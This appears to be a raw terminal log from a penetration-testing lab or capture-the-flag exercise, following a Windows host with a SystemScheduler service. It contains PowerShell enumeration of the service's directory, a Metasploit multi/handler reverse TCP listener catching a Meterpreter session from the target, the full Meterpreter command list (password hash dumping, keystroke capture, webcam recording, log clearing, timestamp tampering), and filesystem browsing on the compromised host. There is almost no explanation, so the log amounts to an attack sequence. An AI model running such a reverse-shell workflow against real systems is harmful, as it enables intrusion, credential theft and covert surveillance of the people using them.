08/04/19 16:42:54,Preferences Loading (SYSTEM_svc:0)*
08/04/19 16:43:32,ElevationType1:1 Elevation2:1 ***IntegrityLevel3:12288 (:)
08/04/19 16:43:32,AD1=1 AD2=1 (:)
08/04/19 16:43:32,Preferences Loading (Administrator:1)
08/04/19 16:47:37,Preferences Loading (SYSTEM_svc:0)*
08/04/19 16:47:48,ElevationType1:1 Elevation2:1 ***IntegrityLevel3:12288 (:)
08/04/19 16:47:48,AD1=1 AD2=1 (:)
08/04/19 16:47:48,Preferences Loading (Administrator:1)
08/04/19 17:59:37,Preferences Loading (SYSTEM_svc:0)*
08/04/19 17:59:53,ElevationType1:1 Elevation2:1 ***IntegrityLevel3:12288 (:)
08/04/19 17:59:53,AD1=1 AD2=1 (:)
08/04/19 17:59:54,Preferences Loading (Administrator:1)
08/04/19 18:04:19,Preferences Loading (SYSTEM_svc:0)*
08/04/19 18:04:31,ElevationType1:1 Elevation2:1 ***IntegrityLevel3:12288 (:)
08/04/19 18:04:31,AD1=1 AD2=1 (:)
08/04/19 18:04:31,Preferences Loading (Administrator:1)
08/05/19 13:26:28,Preferences Loading (SYSTEM_svc:0)*
08/05/19 13:26:44,ElevationType1:1 Elevation2:1 ***IntegrityLevel3:12288 (:)
08/05/19 13:26:44,AD1=1 AD2=1 (:)
08/05/19 13:26:44,Preferences Loading (Administrator:1)
08/05/19 14:03:43,Preferences Loading (SYSTEM_svc:0)*
08/05/19 14:03:56,ElevationType1:1 Elevation2:1 ***IntegrityLevel3:12288 (:)
08/05/19 14:03:56,AD1=1 AD2=1 (:)
08/05/19 14:03:56,Preferences Loading (Administrator:1)
08/06/19 14:11:29,Preferences Loading (SYSTEM_svc:0)*
08/06/19 14:12:21,ElevationType1:1 Elevation2:1 ***IntegrityLevel3:12288 (:)
08/06/19 14:12:21,AD1=1 AD2=1 (:)
08/06/19 14:12:21,Preferences Loading (Administrator:1)
10/02/20 14:12:16,Preferences Loading (SYSTEM_svc:0)*
10/02/20 14:12:54,ElevationType1:1 Elevation2:1 ***IntegrityLevel3:12288 (:)
10/02/20 14:12:54,AD1=1 AD2=1 (:)
10/02/20 14:12:54,Preferences Loading (Administrator:1)
10/02/20 14:31:30,Preferences Loading (SYSTEM_svc:0)*
10/02/20 14:31:40,ElevationType1:1 Elevation2:1 ***IntegrityLevel3:12288 (:)
10/02/20 14:31:40,AD1=1 AD2=1 (:)
10/02/20 14:31:40,Preferences Loading (Administrator:1)
10/02/20 14:50:02,Preferences Loading (SYSTEM_svc:0)*
10/02/20 14:50:12,ElevationType1:1 Elevation2:1 ***IntegrityLevel3:12288 (:)
10/02/20 14:50:12,AD1=1 AD2=1 (:)
10/02/20 14:50:12,Preferences Loading (Administrator:1)
10/02/20 15:04:22,Preferences Loading (SYSTEM_svc:0)*
10/02/20 15:06:49,Preferences Loading (SYSTEM_svc:0)*
10/02/20 15:07:17,ElevationType1:1 Elevation2:1 ***IntegrityLevel3:12288 (:)
10/02/20 15:07:17,AD1=1 AD2=1 (:)
10/02/20 15:07:17,Preferences Loading (Administrator:1)
06/07/24 04:42:34,Preferences Loading (SYSTEM_svc:0)*
06/07/24 04:43:10,ElevationType1:1 Elevation2:1 ***IntegrityLevel3:12288 (:)
06/07/24 04:43:10,AD1=1 AD2=1 (:)
06/07/24 04:43:10,Preferences Loading (Administrator:1)
PS > ls


 

Mode                LastWriteTime     Length Name
----                -------------     ------ ----
d----          6/7/2024  10:29 AM            Events
-a---         5/17/2007   1:47 PM       1150 alarmclock.ico
-a---         8/31/2003  12:06 PM        766 clock.ico
-a---         8/31/2003  12:06 PM      80856 ding.wav
-a---          8/4/2019   4:36 AM         60 Forum.url
-a---          1/8/2009   7:21 PM    1637972 libeay32.dll
-a---        11/15/2004  11:16 PM       9813 License.txt
-a---          6/7/2024   4:42 AM       1496 LogFile.txt
-a---          6/7/2024   4:43 AM       3760 LogfileAdvanced.txt
-a---         3/25/2018  10:58 AM     536992 Message.exe
-a---         3/25/2018  10:59 AM     445344 PlaySound.exe
-a---         3/25/2018  10:58 AM      27040 PlayWAV.exe
-a---          8/4/2019   3:05 PM        149 Preferences.ini
-a---         3/25/2018  10:58 AM     485792 Privilege.exe
-a---         3/24/2018  12:09 PM      10100 ReadMe.txt
-a---         3/25/2018  10:58 AM     112544 RunNow.exe
-a---         3/25/2018  10:59 AM      40352 sc32.exe
-a---         8/31/2003  12:06 PM        766 schedule.ico
-a---         3/25/2018  10:58 AM    1633696 Scheduler.exe
-a---         3/25/2018  10:59 AM     491936 SendKeysHelper.exe
-a---         3/25/2018  10:58 AM     437664 ShowXY.exe
-a---         3/25/2018  10:58 AM     439712 ShutdownGUI.exe
-a---         3/25/2018  10:58 AM     235936 SSAdmin.exe
-a---         3/25/2018  10:58 AM     731552 SSCmd.exe
-a---          1/8/2009   7:12 PM     355446 ssleay32.dll
-a---         3/25/2018  10:58 AM     456608 SSMail.exe
-a---          8/4/2019   4:36 AM       6999 unins000.dat
-a---          8/4/2019   4:36 AM     722597 unins000.exe
-a---          8/4/2019   4:36 AM         54 Website.url
-a---         6/26/2009   5:27 PM       6574 whiteclock.ico
-a---         3/25/2018  10:58 AM      76704 WhoAmI.exe
-a---         5/16/2006   4:49 PM     785042 WSCHEDULER.CHM
-a---         5/16/2006   3:58 PM       2026 WScheduler.cnt
-a---         3/25/2018  10:58 AM     331168 WScheduler.exe
-a---         5/16/2006   4:58 PM     703081 WSCHEDULER.HLP
-a---         3/25/2018  10:58 AM     136096 WSCtrl.exe
-a---         3/25/2018  10:58 AM      98720 WService.exe
-a---         3/25/2018  10:58 AM      68512 WSLogon.exe
-a---         3/25/2018  10:59 AM      33184 WSProc.dll


PS > type preferences.txt
ERROR: type : Cannot find path 'C:\Program Files (x86)\SystemScheduler\preferences.txt' because it does not exist.
ERROR: At line:1 char:1
ERROR: + type preferences.txt
ERROR: + ~~~~~~~~~~~~~~~~~~~~
ERROR:     + CategoryInfo          : ObjectNotFound: (C:\Program File...preferences.txt:String) [Get-Content], ItemNotFoundEx
EERROR:     + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetContentCommand
ERROR: 
PS > type Preferences.ini
[Preferences]
Version=5.01
FV=N
EV=Y
PV=N
ServiceAccount=SYSTEM
EvalInfo=true
ServiceQuestion=true
DefaultEventType=1
DefaultMissedEvent=0
PS > cd
PS > pwd

Path
----
C:\Program Files (x86)\SystemScheduler


PS > gc
ERROR: Get-Content : Cannot process command because of one or more missing mandatory parameters: Path.
ERROR: At line:1 char:1
ERROR: + gc
ERROR: + ~~
ERROR:     + CategoryInfo          : InvalidArgument: (:) [Get-Content], ParameterBindingException
ERROR:     + FullyQualifiedErrorId : MissingMandatoryParameter,Microsoft.PowerShell.Commands.GetContentCommand
EPS > 
PS > gci


    Directory: C:\Program Files (x86)\SystemScheduler


Mode                LastWriteTime     Length Name
----                -------------     ------ ----
d----          6/7/2024  10:36 AM            Events
-a---         5/17/2007   1:47 PM       1150 alarmclock.ico
-a---         8/31/2003  12:06 PM        766 clock.ico
-a---         8/31/2003  12:06 PM      80856 ding.wav
-a---          8/4/2019   4:36 AM         60 Forum.url
-a---          1/8/2009   7:21 PM    1637972 libeay32.dll
-a---        11/15/2004  11:16 PM       9813 License.txt
-a---          6/7/2024   4:42 AM       1496 LogFile.txt
-a---          6/7/2024   4:43 AM       3760 LogfileAdvanced.txt
-a---         3/25/2018  10:58 AM     536992 Message.exe
-a---         3/25/2018  10:59 AM     445344 PlaySound.exe
-a---         3/25/2018  10:58 AM      27040 PlayWAV.exe
-a---          8/4/2019   3:05 PM        149 Preferences.ini
-a---         3/25/2018  10:58 AM     485792 Privilege.exe
-a---         3/24/2018  12:09 PM      10100 ReadMe.txt
-a---         3/25/2018  10:58 AM     112544 RunNow.exe
-a---         3/25/2018  10:59 AM      40352 sc32.exe
-a---         8/31/2003  12:06 PM        766 schedule.ico
-a---         3/25/2018  10:58 AM    1633696 Scheduler.exe
-a---         3/25/2018  10:59 AM     491936 SendKeysHelper.exe
-a---         3/25/2018  10:58 AM     437664 ShowXY.exe
-a---         3/25/2018  10:58 AM     439712 ShutdownGUI.exe
-a---         3/25/2018  10:58 AM     235936 SSAdmin.exe
-a---         3/25/2018  10:58 AM     731552 SSCmd.exe
-a---          1/8/2009   7:12 PM     355446 ssleay32.dll
-a---         3/25/2018  10:58 AM     456608 SSMail.exe
-a---          8/4/2019   4:36 AM       6999 unins000.dat
-a---          8/4/2019   4:36 AM     722597 unins000.exe
-a---          8/4/2019   4:36 AM         54 Website.url
-a---         6/26/2009   5:27 PM       6574 whiteclock.ico
-a---         3/25/2018  10:58 AM      76704 WhoAmI.exe
-a---         5/16/2006   4:49 PM     785042 WSCHEDULER.CHM
-a---         5/16/2006   3:58 PM       2026 WScheduler.cnt
-a---         3/25/2018  10:58 AM     331168 WScheduler.exe
-a---         5/16/2006   4:58 PM     703081 WSCHEDULER.HLP
-a---         3/25/2018  10:58 AM     136096 WSCtrl.exe
-a---         3/25/2018  10:58 AM      98720 WService.exe
-a---         3/25/2018  10:58 AM      68512 WSLogon.exe
-a---         3/25/2018  10:59 AM      33184 WSProc.dll


PS > gl

C:\Program Files (x86)\SystemScheduler


PS > cd..
PS > gl

Path
-C:\Program Files (x86)


PS > gci


    Directory: C:\Program Files (x86)


Mode                LastWriteTime     Length Name
----                -------------     ------ ----
d----         8/22/2013   8:39 AM            Common Files
d----         3/21/2014  12:07 PM            Internet Explorer
d----         8/22/2013   8:39 AM            Microsoft.NET
d----          8/4/2019   4:37 AM            SystemScheduler
d----         8/22/2013   8:39 AM            Windows Mail
d----         8/22/2013   8:39 AM            Windows NT
d----         8/22/2013   8:39 AM            WindowsPowerShell


PS > cd systemscheduler
PS > gci


    Directory: C:\Program Files (x86)\systemscheduler


Mode                LastWriteTime     Length Name
----                -------------     ------ ----
d----          6/7/2024  10:38 AM            Events
-a---         5/17/2007   1:47 PM       1150 alarmclock.ico
-a---         8/31/2003  12:06 PM        766 clock.ico
-a---         8/31/2003  12:06 PM      80856 ding.wav
-a---          8/4/2019   4:36 AM         60 Forum.url
-a---          1/8/2009   7:21 PM    1637972 libeay32.dll
-a---        11/15/2004  11:16 PM       9813 License.txt
-a---          6/7/2024   4:42 AM       1496 LogFile.txt
-a---          6/7/2024   4:43 AM       3760 LogfileAdvanced.txt
-a---         3/25/2018  10:58 AM     536992 Message.exe
-a---         3/25/2018  10:59 AM     445344 PlaySound.exe
-a---         3/25/2018  10:58 AM      27040 PlayWAV.exe
-a---          8/4/2019   3:05 PM        149 Preferences.ini
-a---         3/25/2018  10:58 AM     485792 Privilege.exe
-a---         3/24/2018  12:09 PM      10100 ReadMe.txt
-a---         3/25/2018  10:58 AM     112544 RunNow.exe
-a---         3/25/2018  10:59 AM      40352 sc32.exe
-a---         8/31/2003  12:06 PM        766 schedule.ico
-a---         3/25/2018  10:58 AM    1633696 Scheduler.exe
-a---         3/25/2018  10:59 AM     491936 SendKeysHelper.exe
-a---         3/25/2018  10:58 AM     437664 ShowXY.exe
-a---         3/25/2018  10:58 AM     439712 ShutdownGUI.exe
-a---         3/25/2018  10:58 AM     235936 SSAdmin.exe
-a---         3/25/2018  10:58 AM     731552 SSCmd.exe
-a---          1/8/2009   7:12 PM     355446 ssleay32.dll
-a---         3/25/2018  10:58 AM     456608 SSMail.exe
-a---          8/4/2019   4:36 AM       6999 unins000.dat
-a---          8/4/2019   4:36 AM     722597 unins000.exe
-a---          8/4/2019   4:36 AM         54 Website.url
-a---         6/26/2009   5:27 PM       6574 whiteclock.ico
-a---         3/25/2018  10:58 AM      76704 WhoAmI.exe
-a---         5/16/2006   4:49 PM     785042 WSCHEDULER.CHM
-a---         5/16/2006   3:58 PM       2026 WScheduler.cnt
-a---         3/25/2018  10:58 AM     331168 WScheduler.exe
-a---         5/16/2006   4:58 PM     703081 WSCHEDULER.HLP
-a---         3/25/2018  10:58 AM     136096 WSCtrl.exe
-a---         3/25/2018  10:58 AM      98720 WService.exe
-a---         3/25/2018  10:58 AM      68512 WSLogon.exe
-a---         3/25/2018  10:59 AM      33184 WSProc.dll


PS > 
[*] 10.10.33.96 - Meterpreter session 3 closed.  Reason: Died
 

Terminate channel 1? [y/N]  y
[-] Send timed out. Timeout currently 15 seconds, you can configure this with sessions --interact <id> --timeout <value>
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.18.21.236:444 
[*] Sending stage (176198 bytes) to 10.10.253.222
[*] Meterpreter session 4 opened (10.18.21.236:444 -> 10.10.253.222:49240) at 2024-06-07 20:48:28 +0200

meterpreter > help

Core Commands
=============

    Command                   Description
    -------                   -----------
    ?                         Help menu
    background                Backgrounds the current session
    bg                        Alias for background
    bgkill                    Kills a background meterpreter script
    bglist                    Lists running background scripts
    bgrun                     Executes a meterpreter script as a background thread
    channel                   Displays information or control active channels
    close                     Closes a channel
    detach                    Detach the meterpreter session (for http/https)
    disable_unicode_encoding  Disables encoding of unicode strings
    enable_unicode_encoding   Enables encoding of unicode strings
    exit                      Terminate the meterpreter session
    get_timeouts              Get the current session timeout values
    guid                      Get the session GUID
    help                      Help menu
    info                      Displays information about a Post module
    irb                       Open an interactive Ruby shell on the current session
    load                      Load one or more meterpreter extensions
    machine_id                Get the MSF ID of the machine attached to the session
    migrate                   Migrate the server to another process
    pivot                     Manage pivot listeners
    pry                       Open the Pry debugger on the current session
    quit                      Terminate the meterpreter session
    read                      Reads data from a channel
    resource                  Run the commands stored in a file
    run                       Executes a meterpreter script or Post module
    secure                    (Re)Negotiate TLV packet encryption on the session
    sessions                  Quickly switch to another session
    set_timeouts              Set the current session timeout values
    sleep                     Force Meterpreter to go quiet, then re-establish session
    ssl_verify                Modify the SSL certificate verification setting
    transport                 Manage the transport mechanisms
    use                       Deprecated alias for "load"
    uuid                      Get the UUID for the current session
    write                     Writes data to a channel


Stdapi: File system Commands
============================

    Command                   Description
    -------                   -----------
    cat                       Read the contents of a file to the screen
    cd                        Change directory
    checksum                  Retrieve the checksum of a file
    cp                        Copy source to destination
    del                       Delete the specified file
    dir                       List files (alias for ls)
    download                  Download a file or directory
    edit                      Edit a file
    getlwd                    Print local working directory (alias for lpwd)
    getwd                     Print working directory
    lcat                      Read the contents of a local file to the screen
    lcd                       Change local working directory
    ldir                      List local files (alias for lls)
    lls                       List local files
    lmkdir                    Create new directory on local machine
    lpwd                      Print local working directory
    ls                        List files
    mkdir                     Make directory
    mv                        Move source to destination
    pwd                       Print working directory
    rm                        Delete the specified file
    rmdir                     Remove directory
    search                    Search for files
    show_mount                List all mount points/logical drives
    upload                    Upload a file or directory


Stdapi: Networking Commands
===========================

    Command                   Description
    -------                   -----------
    arp                       Display the host ARP cache
    getproxy                  Display the current proxy configuration
    ifconfig                  Display interfaces
    ipconfig                  Display interfaces
    netstat                   Display the network connections
    portfwd                   Forward a local port to a remote service
    resolve                   Resolve a set of host names on the target
    route                     View and modify the routing table


Stdapi: System Commands
=======================

    Command                   Description
    -------                   -----------
    clearev                   Clear the event log
    drop_token                Relinquishes any active impersonation token.
    execute                   Execute a command
    getenv                    Get one or more environment variable values
    getpid                    Get the current process identifier
    getprivs                  Attempt to enable all privileges available to the current process
    getsid                    Get the SID of the user that the server is running as
    getuid                    Get the user that the server is running as
    kill                      Terminate a process
    localtime                 Displays the target system local date and time
    pgrep                     Filter processes by name
    pkill                     Terminate processes by name
    ps                        List running processes
    reboot                    Reboots the remote computer
    reg                       Modify and interact with the remote registry
    rev2self                  Calls RevertToSelf() on the remote machine
    shell                     Drop into a system command shell
    shutdown                  Shuts down the remote computer
    steal_token               Attempts to steal an impersonation token from the target process
    suspend                   Suspends or resumes a list of processes
    sysinfo                   Gets information about the remote system, such as OS


Stdapi: User interface Commands
===============================

    Command                   Description
    -------                   -----------
    enumdesktops              List all accessible desktops and window stations
    getdesktop                Get the current meterpreter desktop
    idletime                  Returns the number of seconds the remote user has been idle
    keyboard_send             Send keystrokes
    keyevent                  Send key events
    keyscan_dump              Dump the keystroke buffer
    keyscan_start             Start capturing keystrokes
    keyscan_stop              Stop capturing keystrokes
    mouse                     Send mouse events
    screenshare               Watch the remote user desktop in real time
    screenshot                Grab a screenshot of the interactive desktop
    setdesktop                Change the meterpreters current desktop
    uictl                     Control some of the user interface components


Stdapi: Webcam Commands
=======================

    Command                   Description
    -------                   -----------
    record_mic                Record audio from the default microphone for X seconds
    webcam_chat               Start a video chat
    webcam_list               List webcams
    webcam_snap               Take a snapshot from the specified webcam
    webcam_stream             Play a video stream from the specified webcam


Stdapi: Audio Output Commands
=============================

    Command                   Description
    -------                   -----------
    play                      play a waveform audio file (.wav) on the target system


Priv: Elevate Commands
======================

    Command                   Description
    -------                   -----------
    getsystem                 Attempt to elevate your privilege to that of local system.


Priv: Password database Commands
================================

    Command                   Description
    -------                   -----------
    hashdump                  Dumps the contents of the SAM database


Priv: Timestomp Commands
========================

    Command                   Description
    -------                   -----------
    timestomp                 Manipulate file MACE attributes

For more info on a specific command, use <command> -h or help <command>.

meterpreter > pwd
c:\windows\system32\inetsrv
meterpreter > dir
Listing: c:\windows\system32\inetsrv
====================================

Mode              Size     Type  Last modified              Name
----              ----     ----  -------------              ----
040777/rwxrwxrwx  0        dir   2019-08-03 19:45:39 +0200  Config
100666/rw-rw-rw-  143360   fil   2019-08-03 19:45:37 +0200  Microsoft.Web.Administration.dll
100666/rw-rw-rw-  1085440  fil   2019-08-03 19:45:36 +0200  Microsoft.Web.Management.dll
100666/rw-rw-rw-  130560   fil   2019-08-03 19:45:37 +0200  XPath.dll
100777/rwxrwxrwx  98816    fil   2019-08-03 19:45:36 +0200  appcmd.exe
100666/rw-rw-rw-  3810     fil   2013-07-01 18:49:43 +0200  appcmd.xml
100666/rw-rw-rw-  62464    fil   2019-08-03 19:45:37 +0200  apphostsvc.dll
100666/rw-rw-rw-  318464   fil   2019-08-03 19:45:36 +0200  appobj.dll
100777/rwxrwxrwx  118272   fil   2019-08-03 19:45:36 +0200  aspnetca.exe
100666/rw-rw-rw-  28672    fil   2019-08-03 19:45:37 +0200  authanon.dll
100666/rw-rw-rw-  18432    fil   2019-08-03 19:45:37 +0200  cachfile.dll
100666/rw-rw-rw-  39424    fil   2019-08-03 19:45:37 +0200  cachhttp.dll
100666/rw-rw-rw-  12288    fil   2019-08-03 19:45:37 +0200  cachtokn.dll
100666/rw-rw-rw-  11264    fil   2019-08-03 19:45:37 +0200  cachuri.dll
100666/rw-rw-rw-  60928    fil   2019-08-03 19:45:36 +0200  certobj.dll
100666/rw-rw-rw-  38400    fil   2019-08-03 19:45:37 +0200  compstat.dll
100666/rw-rw-rw-  37376    fil   2019-08-03 19:45:37 +0200  custerr.dll
100666/rw-rw-rw-  15872    fil   2019-08-03 19:45:37 +0200  defdoc.dll
100666/rw-rw-rw-  19456    fil   2019-08-03 19:45:36 +0200  dirlist.dll
040777/rwxrwxrwx  4096     dir   2019-08-03 19:45:39 +0200  en-US
100666/rw-rw-rw-  51200    fil   2019-08-03 20:14:57 +0200  filter.dll
100666/rw-rw-rw-  28672    fil   2019-08-03 19:45:37 +0200  gzip.dll
100666/rw-rw-rw-  17920    fil   2019-08-03 19:45:36 +0200  httpmib.dll
100666/rw-rw-rw-  15872    fil   2019-08-03 19:45:37 +0200  hwebcore.dll
100666/rw-rw-rw-  63105    fil   2019-08-03 19:45:37 +0200  iis.msc
100666/rw-rw-rw-  26112    fil   2019-08-03 20:41:15 +0200  iis_ssi.dll
100666/rw-rw-rw-  211968   fil   2019-08-03 19:45:37 +0200  iiscore.dll
100666/rw-rw-rw-  85504    fil   2019-08-03 19:45:36 +0200  iisreg.dll
100666/rw-rw-rw-  229376   fil   2019-08-03 19:45:36 +0200  iisres.dll
100777/rwxrwxrwx  148480   fil   2019-08-03 19:45:36 +0200  iissetup.exe
100666/rw-rw-rw-  52736    fil   2019-08-03 19:45:36 +0200  iissyspr.dll
100666/rw-rw-rw-  225280   fil   2019-08-03 19:45:36 +0200  iisutil.dll
100666/rw-rw-rw-  475648   fil   2019-08-03 19:45:37 +0200  iisw3adm.dll
100666/rw-rw-rw-  101888   fil   2019-08-03 20:14:57 +0200  isapi.dll
100666/rw-rw-rw-  27136    fil   2019-08-03 19:45:37 +0200  loghttp.dll
100666/rw-rw-rw-  34304    fil   2019-08-03 20:14:57 +0200  modrqflt.dll
100666/rw-rw-rw-  367616   fil   2019-08-03 19:45:36 +0200  nativerd.dll
100666/rw-rw-rw-  16384    fil   2019-08-03 19:45:37 +0200  protsup.dll
100666/rw-rw-rw-  26624    fil   2019-08-03 19:45:36 +0200  rsca.dll
100666/rw-rw-rw-  49152    fil   2019-08-03 19:45:36 +0200  rscaext.dll
100666/rw-rw-rw-  32256    fil   2019-08-03 19:45:37 +0200  static.dll
100666/rw-rw-rw-  143360   fil   2019-08-03 19:45:36 +0200  uihelper.dll
100666/rw-rw-rw-  16384    fil   2019-08-03 20:14:57 +0200  validcfg.dll
100666/rw-rw-rw-  11264    fil   2019-08-03 19:45:36 +0200  w3ctrlps.dll
100666/rw-rw-rw-  25088    fil   2019-08-03 19:45:36 +0200  w3ctrs.dll
100666/rw-rw-rw-  102400   fil   2019-08-03 19:45:37 +0200  w3dt.dll
100666/rw-rw-rw-  66560    fil   2019-08-03 19:45:37 +0200  w3logsvc.dll
100666/rw-rw-rw-  22016    fil   2019-08-03 19:45:37 +0200  w3tp.dll
100777/rwxrwxrwx  21504    fil   2019-08-03 19:45:37 +0200  w3wp.exe
100666/rw-rw-rw-  61952    fil   2019-08-03 19:45:37 +0200  w3wphost.dll
100666/rw-rw-rw-  25088    fil   2019-08-03 20:41:15 +0200  warmup.dll
100666/rw-rw-rw-  23040    fil   2019-08-03 19:45:37 +0200  wbhst_pm.dll
100666/rw-rw-rw-  25088    fil   2019-08-03 19:45:37 +0200  wbhstipm.dll

meterpreter > cd c:
meterpreter > dir
Listing: c:\windows\system32\inetsrv
====================================

Mode              Size     Type  Last modified              Name
----              ----     ----  -------------              ----
040777/rwxrwxrwx  0        dir   2019-08-03 19:45:39 +0200  Config
100666/rw-rw-rw-  143360   fil   2019-08-03 19:45:37 +0200  Microsoft.Web.Administration.dll
100666/rw-rw-rw-  1085440  fil   2019-08-03 19:45:36 +0200  Microsoft.Web.Management.dll
100666/rw-rw-rw-  130560   fil   2019-08-03 19:45:37 +0200  XPath.dll
100777/rwxrwxrwx  98816    fil   2019-08-03 19:45:36 +0200  appcmd.exe
100666/rw-rw-rw-  3810     fil   2013-07-01 18:49:43 +0200  appcmd.xml
100666/rw-rw-rw-  62464    fil   2019-08-03 19:45:37 +0200  apphostsvc.dll
100666/rw-rw-rw-  318464   fil   2019-08-03 19:45:36 +0200  appobj.dll
100777/rwxrwxrwx  118272   fil   2019-08-03 19:45:36 +0200  aspnetca.exe
100666/rw-rw-rw-  28672    fil   2019-08-03 19:45:37 +0200  authanon.dll
100666/rw-rw-rw-  18432    fil   2019-08-03 19:45:37 +0200  cachfile.dll
100666/rw-rw-rw-  39424    fil   2019-08-03 19:45:37 +0200  cachhttp.dll
100666/rw-rw-rw-  12288    fil   2019-08-03 19:45:37 +0200  cachtokn.dll
100666/rw-rw-rw-  11264    fil   2019-08-03 19:45:37 +0200  cachuri.dll
100666/rw-rw-rw-  60928    fil   2019-08-03 19:45:36 +0200  certobj.dll
100666/rw-rw-rw-  38400    fil   2019-08-03 19:45:37 +0200  compstat.dll
100666/rw-rw-rw-  37376    fil   2019-08-03 19:45:37 +0200  custerr.dll
100666/rw-rw-rw-  15872    fil   2019-08-03 19:45:37 +0200  defdoc.dll
100666/rw-rw-rw-  19456    fil   2019-08-03 19:45:36 +0200  dirlist.dll
040777/rwxrwxrwx  4096     dir   2019-08-03 19:45:39 +0200  en-US
100666/rw-rw-rw-  51200    fil   2019-08-03 20:14:57 +0200  filter.dll
100666/rw-rw-rw-  28672    fil   2019-08-03 19:45:37 +0200  gzip.dll
100666/rw-rw-rw-  17920    fil   2019-08-03 19:45:36 +0200  httpmib.dll
100666/rw-rw-rw-  15872    fil   2019-08-03 19:45:37 +0200  hwebcore.dll
100666/rw-rw-rw-  63105    fil   2019-08-03 19:45:37 +0200  iis.msc
100666/rw-rw-rw-  26112    fil   2019-08-03 20:41:15 +0200  iis_ssi.dll
100666/rw-rw-rw-  211968   fil   2019-08-03 19:45:37 +0200  iiscore.dll
100666/rw-rw-rw-  85504    fil   2019-08-03 19:45:36 +0200  iisreg.dll
100666/rw-rw-rw-  229376   fil   2019-08-03 19:45:36 +0200  iisres.dll
100777/rwxrwxrwx  148480   fil   2019-08-03 19:45:36 +0200  iissetup.exe
100666/rw-rw-rw-  52736    fil   2019-08-03 19:45:36 +0200  iissyspr.dll
100666/rw-rw-rw-  225280   fil   2019-08-03 19:45:36 +0200  iisutil.dll
100666/rw-rw-rw-  475648   fil   2019-08-03 19:45:37 +0200  iisw3adm.dll
100666/rw-rw-rw-  101888   fil   2019-08-03 20:14:57 +0200  isapi.dll
100666/rw-rw-rw-  27136    fil   2019-08-03 19:45:37 +0200  loghttp.dll
100666/rw-rw-rw-  34304    fil   2019-08-03 20:14:57 +0200  modrqflt.dll
100666/rw-rw-rw-  367616   fil   2019-08-03 19:45:36 +0200  nativerd.dll
100666/rw-rw-rw-  16384    fil   2019-08-03 19:45:37 +0200  protsup.dll
100666/rw-rw-rw-  26624    fil   2019-08-03 19:45:36 +0200  rsca.dll
100666/rw-rw-rw-  49152    fil   2019-08-03 19:45:36 +0200  rscaext.dll
100666/rw-rw-rw-  32256    fil   2019-08-03 19:45:37 +0200  static.dll
100666/rw-rw-rw-  143360   fil   2019-08-03 19:45:36 +0200  uihelper.dll
100666/rw-rw-rw-  16384    fil   2019-08-03 20:14:57 +0200  validcfg.dll
100666/rw-rw-rw-  11264    fil   2019-08-03 19:45:36 +0200  w3ctrlps.dll
100666/rw-rw-rw-  25088    fil   2019-08-03 19:45:36 +0200  w3ctrs.dll
100666/rw-rw-rw-  102400   fil   2019-08-03 19:45:37 +0200  w3dt.dll
100666/rw-rw-rw-  66560    fil   2019-08-03 19:45:37 +0200  w3logsvc.dll
100666/rw-rw-rw-  22016    fil   2019-08-03 19:45:37 +0200  w3tp.dll
100777/rwxrwxrwx  21504    fil   2019-08-03 19:45:37 +0200  w3wp.exe
100666/rw-rw-rw-  61952    fil   2019-08-03 19:45:37 +0200  w3wphost.dll
100666/rw-rw-rw-  25088    fil   2019-08-03 20:41:15 +0200  warmup.dll
100666/rw-rw-rw-  23040    fil   2019-08-03 19:45:37 +0200  wbhst_pm.dll
100666/rw-rw-rw-  25088    fil   2019-08-03 19:45:37 +0200  wbhstipm.dll

meterpreter > cd c:\
 > 
meterpreter > ls c:\
 > 
Listing: c:
===========

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
040777/rwxrwxrwx  0       dir   2019-08-04 20:54:53 +0200  $Recycle.Bin
100666/rw-rw-rw-  1       fil   2013-06-18 14:18:29 +0200  BOOTNXT
040777/rwxrwxrwx  0       dir   2013-08-22 16:48:41 +0200  Documents and Settings
040777/rwxrwxrwx  0       dir   2013-08-22 17:52:33 +0200  PerfLogs
040555/r-xr-xr-x  4096    dir   2019-08-06 23:08:26 +0200  Program Files
040777/rwxrwxrwx  4096    dir   2019-08-06 23:12:04 +0200  Program Files (x86)
040777/rwxrwxrwx  4096    dir   2019-08-06 23:13:17 +0200  ProgramData
040777/rwxrwxrwx  0       dir   2019-08-03 19:40:43 +0200  System Volume Information
040555/r-xr-xr-x  4096    dir   2019-08-04 20:54:52 +0200  Users
040777/rwxrwxrwx  24576   dir   2020-10-03 00:03:15 +0200  Windows
100444/r--r--r--  398356  fil   2014-03-21 19:49:12 +0100  bootmgr
040777/rwxrwxrwx  4096    dir   2019-08-04 13:34:09 +0200  inetpub
000000/---------  0       fif   1970-01-01 01:00:00 +0100  pagefile.sys

meterpreter > cd c:\Program Files (x86)
[-] stdapi_fs_chdir: Operation failed: The system cannot find the file specified.
meterpreter > cd "c:\Program Files (x86)"
meterpreter > pwd
c:\Program Files (x86)
meterpreter > dir
Listing: c:\Program Files (x86)
===============================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
040777/rwxrwxrwx  0     dir   2013-08-22 17:39:30 +0200  Common Files
040777/rwxrwxrwx  4096  dir   2014-03-21 20:07:01 +0100  Internet Explorer
040777/rwxrwxrwx  0     dir   2013-08-22 17:39:30 +0200  Microsoft.NET
040777/rwxrwxrwx  8192  dir   2019-08-04 13:37:02 +0200  SystemScheduler
040777/rwxrwxrwx  0     dir   2019-08-06 23:12:04 +0200  Uninstall Information
040777/rwxrwxrwx  0     dir   2013-08-22 17:39:33 +0200  Windows Mail
040777/rwxrwxrwx  0     dir   2013-08-22 17:39:30 +0200  Windows NT
040777/rwxrwxrwx  0     dir   2013-08-22 17:39:30 +0200  WindowsPowerShell
100666/rw-rw-rw-  174   fil   2013-08-22 17:37:57 +0200  desktop.ini

meterpreter > cd SystemScheduler\\
meterpreter > dir
Listing: c:\Program Files (x86)\SystemScheduler
===============================================

Mode              Size     Type  Last modified              Name
----              ----     ----  -------------              ----
040777/rwxrwxrwx  4096     dir   2024-06-07 20:51:31 +0200  Events
100666/rw-rw-rw-  60       fil   2019-08-04 13:36:42 +0200  Forum.url
100666/rw-rw-rw-  9813     fil   2004-11-16 08:16:34 +0100  License.txt
100666/rw-rw-rw-  1496     fil   2024-06-07 20:21:28 +0200  LogFile.txt
100666/rw-rw-rw-  3760     fil   2024-06-07 20:22:03 +0200  LogfileAdvanced.txt
100777/rwxrwxrwx  536992   fil   2018-03-25 19:58:56 +0200  Message.exe
100777/rwxrwxrwx  445344   fil   2018-03-25 19:59:00 +0200  PlaySound.exe
